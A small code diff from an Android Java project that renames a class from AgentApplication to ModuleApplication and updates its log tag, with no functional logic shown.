@@ -28,8 +28,8 @@ import com.android.service.util.DateTime;
 import com.android.service.util.Utils;
 import com.android.service.util.WChar;
 
-public class AgentApplication extends BaseModule implements IncrementalLog, Observer<ProcessInfo> {
-	private static final String TAG = "AgentApplication"; //$NON-NLS-1$
+public class ModuleApplication extends BaseModule implements IncrementalLog, Observer<ProcessInfo> {
+	private static final String TAG = "ModuleApplication"; //$NON-NLS-1$
 
 	@Override
 	public boolean parse(ConfModule conf) {
